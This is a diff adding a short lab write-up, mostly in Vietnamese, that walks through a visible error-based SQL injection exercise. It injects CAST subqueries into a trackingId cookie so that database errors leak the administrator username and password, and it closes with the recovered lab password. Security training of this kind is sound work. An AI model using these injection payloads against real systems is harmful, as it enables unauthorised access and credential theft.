@@ -1,0 +1,18 @@
+SQL injection - Visible error-based SQL injection
+
+End Goal: find a way to leak the password for the administrator user, then log in to their account.
+
+Analysis
+--------
+Bước 1: thử thêm ' vào cuối liên kết để xem phản hồi --> không hiển thị thông tin gì nhưng không còn hiển thị dữ liệu --> có thể can thiệp vào csdl nhưng không hiển thị được dữ liệu 
+Bước 2: copy link gán vào chrome của burp, ấn vào home --> xem history --> có trackingId --> thử thêm ' vào cuối phần giá trị của trackingId --> hiển thị ra lỗi:
+SELECT * FROM tracking WHERE id = '...''. Expected char --> nó hiển thị toàn bộ truy vấn --> có thể trích xuất dữ liệu thông qua lỗi. 
+Bước 3: thêm ' AND CAST((SELECT 'a' FROM users LIMIT 1) AS int)-- vào sau giá trị của trackingId
+--> LỖI: đối số của AND phải là kiểu boolean, không phải kiểu integer
+Vị trí: 58
+--> có tồn tại bảng user 
+Bước 4: thêm ' AND 1=CAST((SELECT username FROM users LIMIT 1)AS int)-- --> lỗi Expected char vì thiếu kết thúc với kí tự -' --> comment bị cắt vì giới hạn kí tự --> cần xóa giá trị tracking 
+Bước 5: --> hiển thị lỗi invalid input syntax for type integer administrator --> có user administrator trong bảng users
+Bước 6: --> có thể đổi username thành password để chọn ra hàng đầu tiên của bảng password --> hiển thị lỗi:
+invalid input syntax for type integer: "mật khẩu"
+--> có giá trị của mật khẩu là: yfox4qm853yrwmkbvjb4
